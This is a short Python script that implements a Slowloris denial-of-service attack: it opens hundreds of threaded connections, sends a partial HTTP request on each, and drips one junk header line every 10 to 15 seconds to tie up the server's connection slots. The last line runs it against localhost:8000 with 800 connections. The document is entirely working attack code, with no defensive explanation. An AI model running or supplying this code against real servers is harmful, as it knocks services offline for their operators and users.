import socket
import threading
import time
import random

def slowloris_worker(host, port, duration):
    """Send partial requests very slowly"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(b"GET / HTTP/1.1\r\n")
        
        end_time = time.time() + duration
        while time.time() < end_time:
            # Send one header byte every few seconds
            s.sendall(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            time.sleep(random.uniform(10, 15))
        
        s.close()
    except:
        pass

def slowloris_attack(host, port, connections=500, duration=60):
    """Launch slowloris attack"""
    print(f"Launching Slowloris attack with {connections} connections")
    
    threads = []
    for i in range(connections):
        t = threading.Thread(target=slowloris_worker, args=(host, port, duration))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.02)  # Stagger connection creation
    
    print(f"All {connections} connections established")
    time.sleep(duration)

# Run it
slowloris_attack('localhost', 8000, connections=800, duration=45)
